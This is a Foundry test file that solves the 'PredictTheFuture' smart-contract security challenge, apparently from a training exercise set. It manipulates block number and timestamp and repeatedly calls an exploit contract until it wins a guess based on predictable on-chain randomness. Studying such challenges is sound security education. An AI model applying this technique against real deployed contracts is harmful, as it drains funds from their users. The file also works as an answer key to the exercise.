// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        uint8 i;
        for( i= 0; i < 10; i++){
             vm.roll(104293);
             vm.warp(93582192);
            exploitContract.lockInGuess{value: 1 ether}();
            vm.roll(104293 + 2);
            vm.warp(93582192 + 1000);
            if(exploitContract.settle()){
                break;
            }
        }
       
        for(uint8 j = 0; j < i ; j++){
            vm.roll(104293);
            vm.warp(93582192);
            exploitContract.lockInGuessWithN{value: 1 ether}(i);
            vm.roll(104293 + 2);
            vm.warp(93582192 + 1000);
            exploitContract.settle();
        }

        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
